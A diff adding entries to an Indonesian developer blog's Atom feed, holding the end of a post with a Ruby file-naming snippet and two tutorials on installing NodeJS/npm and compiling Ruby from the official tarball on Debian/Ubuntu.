+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="k">begin</span>
+</span><span class='line'>    <span class="nb">puts</span> <span class="n">green</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Please</span> <span class="n">specify</span> <span class="n">a</span> <span class="n">file</span> <span class="nb">name</span> <span class="p">(</span><span class="n">a</span><span class="o">-</span><span class="n">zA</span><span class="o">-</span><span class="no">Z0</span><span class="o">-</span><span class="mi">9</span><span class="p">)</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>    <span class="n">fileName</span> <span class="o">=</span> <span class="nb">gets</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
+</span><span class='line'>    <span class="n">isFileNameValid</span> <span class="o">=</span> <span class="n">fileName</span><span class="o">.</span><span class="n">scan</span><span class="p">(</span><span class="sr">/([^a-zA-Z0-9]+)/</span><span class="p">)</span><span class="o">.</span><span class="n">length</span><span class="p">;</span>
+</span><span class='line'><span class="k">end</span> <span class="k">while</span> <span class="n">isFileNameValid</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;title ok tell the user&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="nb">puts</span> <span class="n">yellow</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">Judul</span> <span class="n">file</span> <span class="n">yang</span> <span class="n">terpilih</span> <span class="n">adalah</span> <span class="p">:</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="n">cyan</span><span class="p">(</span><span class="n">fileName</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;pre&gt;&lt;code&gt;        f = File.open(fileName + &quot;.txt&quot;, &#39;w&#39;)</span>
+</span><span class='line'><span class="sr">        f.write(text)</span>
+</span><span class='line'><span class="sr">        f.close</span>
+</span><span class='line'><span class="sr">        puts fileName + &quot;.txt - &quot; + green(&quot;Downloaded&quot;)</span>
+</span><span class='line'><span class="sr">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;</span><span class="sr">/pre&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="sr">&lt;h1&gt;end step&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<h3><a href="https://github.com/kampoeng/ruby-AFDFDE">View Project on Github</a></h3>
+
+<div class="github-widget" data-repo="kampoeng/ruby-AFDFDE"></div>
+
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Cara Install NodeJS Dan NPM Di Ubuntu]]></title>
+    <link href="http://sundi3yansyah.com/article/2014/07/05/cara-install-nodejs-dan-npm-di-ubuntu/"/>
+    <updated>2014-07-05T20:58:02+07:00</updated>
+    <id>http://sundi3yansyah.com/article/2014/07/05/cara-install-nodejs-dan-npm-di-ubuntu</id>
+    <content type="html"><![CDATA[<p>Install dulu Depensial dari software python dan menambahkan PPA dari NodeJS untuk ubuntunya.</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install python-software-properties
+</span><span class='line'>apt-add-repository ppa:chris-lea/node.js
+</span><span class='line'>apt-get update</span></code></pre></td></tr></table></div></figure></p>
+
+<!-- more -->
+
+
+<p>Kalau sudah lanjut ke installasi</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install nodejs</span></code></pre></td></tr></table></div></figure></p>
+
+<p>NB: Jika ada persetujuan di <b>Y</b></p>
+
+<p>Untuk melihat versi yang sudah terinstall tadi, caranya:</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>node -v</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Contoh outputnya</p>
+
+<p><code>v0.10.29</code></p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install npm</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Untuk melihat versi yang sudah terinstall tadi, caranya:</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>npm -v</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Contoh outputnya</p>
+
+<p><code>1.4.14</code></p>
+
+<h4>Ini berlaku juga untuk distro <em>Linux Mint</em></h4>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Cara Install Dan Compile Ruby via Tarball Di Debian/Ubuntu]]></title>
+    <link href="http://sundi3yansyah.com/article/2014/07/03/cara-install-dan-compile-ruby-via-tarball-di-debian-ubuntu/"/>
+    <updated>2014-07-03T03:21:25+07:00</updated>
+    <id>http://sundi3yansyah.com/article/2014/07/03/cara-install-dan-compile-ruby-via-tarball-di-debian-ubuntu</id>
+    <content type="html"><![CDATA[<p>Banyak cara untuk meng-Install Ruby, tapi kali ini saya akan mengInsall Ruby menggunakan Tarball ini apa yang saya lakukan di Komputer saya, saya menggunakan Ruby versi 1.9.3 jika kalian ingin menginstall di versi atasnya juga gpp tutorial ini teteap berlaku untuk versi berapa saja dan ini saya menggunakan Sistem Operasi Debian/Ubuntu.</p>
+
+<p>Langsung saja buka terminal.
+Pertama kita perlu menginstal beberapa development tools dan libraries yang Ruby perlu untuk mengkompilasi.</p>
+
+<!-- more -->
+
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install build-essential vim git-core curl</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Lanjut&hellip;</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install bison openssl libreadline6 libreadline6-dev zlib1g zlib1g-dev libssl-dev libyaml-dev libxml2-dev libxslt-dev autoconf libc6-dev ncurses-dev</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Lanjut&hellip;</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install libcurl4-openssl-dev libopenssl-ruby apache2-prefork-dev libapr1-dev libaprutil1-dev</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Lanjut&hellip;</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install libx11-dev libffi-dev tcl-dev tk-dev</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Sudah? Kalau sudah selesai kalain buka ini <a href="https://www.ruby-lang.org/en/downloads/"><a href="https://www.ruby-lang.org/en/downloads/">https://www.ruby-lang.org/en/downloads/</a></a></p>
+
+<p><img class="<a" src="href="http://i40.photobucket.com/albums/e228/sundi3yansyah/L2ry8bb_zps48c28ea5.png">http://i40.photobucket.com/albums/e228/sundi3yansyah/L2ry8bb_zps48c28ea5.png</a>&#8221; title=&#8221;downloads ruby&#8221; ></p>
+
+<p>Dan pilih versi yang kalain inginkan, dan download.</p>
+
+<p>Downloadnya bisa menggunakan wget atau melalu browser, jika menggunakan wget misalnya.</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget &lt;a href="http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gz">http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gz&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Dan balik lagi ke terminal masuk ke directori dimana file Ruby kalian berada, kemudian di buka arsipnya.</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>tar -xvf ruby-*.tar.gz&lt;br/></span></code></pre></td></tr></table></div></figure></p>
+
+<p>Kemudian masuk ke folder rubynya</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd ruby-*</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Kemudian jalankan ini, bila perlu kalian baca-baca dulu <code>README.md</code> kalau gk butuh membaca ya lanjut lagi.</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./configure</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>make</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>make test</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>make install</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Lanjut&hellip;!
+Install Bundler</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gem install bundler</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Butuh Rails nggak? ya kalau yang mau main rails silakan install. (Proses membutuhkan waktu kurang lebih 10menit, tergantung koneksi)</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gem install rails</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Kalau mau cari <code>gems</code> nya disini: <a href="https://rubygems.org/gems/">https://rubygems.org/gems/</a></p>
+
+<p>Selesai sudah, yuk keluar.</p>
+
+<p><figure class='code'><figcaption><span>root@sundi3yansyah </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>exit</span></code></pre></td></tr></table></div></figure></p>
+]]></content>
+  </entry>
+  
+</feed>
